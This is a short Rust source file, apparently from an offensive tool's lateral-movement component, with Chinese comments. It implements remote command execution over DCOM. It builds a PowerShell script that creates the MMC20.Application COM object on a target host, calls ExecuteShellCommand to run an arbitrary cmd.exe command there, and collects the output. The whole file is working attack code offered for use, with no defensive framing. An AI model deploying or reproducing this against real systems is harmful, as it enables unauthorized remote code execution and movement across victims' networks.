//! DCOM 远程执行模块

use crate::lateral::LateralConfig;

pub async fn execute_dcom(config: &LateralConfig) -> Result<(String, String, i32), String> {
    let target = &config.target;
    let full_command = format!("{} {}", config.command, config.args.join(" "));

    tracing::info!("[DCOM] {} -> {}", whoami::hostname(), target);

    // 使用PowerShell DCOM执行
    let ps_script = format!(
        r#"$com = [Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","{}"));
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c {}","7");
"#,
        target,
        full_command.replace("\"", "\\\"")
    );

    let output = std::process::Command::new("powershell.exe")
        .args(["-NoProfile", "-NonInteractive", "-Command", &ps_script])
        .output()
        .map_err(|e| format!("DCOM执行失败: {}", e))?;

    Ok((
        String::from_utf8_lossy(&output.stdout).to_string(),
        String::from_utf8_lossy(&output.stderr).to_string(),
        output.status.code().unwrap_or(-1),
    ))
}
